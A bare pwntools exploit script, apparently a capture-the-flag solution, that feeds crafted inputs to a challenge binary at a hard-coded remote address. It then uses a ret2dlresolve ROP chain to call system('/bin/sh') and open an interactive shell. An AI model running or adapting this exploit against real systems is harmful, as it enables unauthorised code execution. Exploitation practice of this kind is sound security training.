#coding:utf-8
from pwn import *
from roputils import *
context.log_level = 'debug'
debug = 0
elf = ELF('pwn')

if debug:
	sh = process('./pwn')
	#libc = elf.libc
else:
	sh = remote('39.105.138.97', 1234)
	#libc = ELF('libc.so.6')

payload = p32(0) + 'a'*44
sh.send(payload)
sleep(0.1)
payload = '\xff' * 32
sh.send(payload)
sleep(0.1)
#gdb.attach(sh,'b *0x080492A8 \n c')
sh.sendline("hello_boy ")

sh.sendline("-2147483648")

sh.sendline("-1")

rop = ROP('./pwn')
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
payload = flat({112:raw_rop,256:dlresolve.payload})
sh.sendline(payload)
sh.interactive()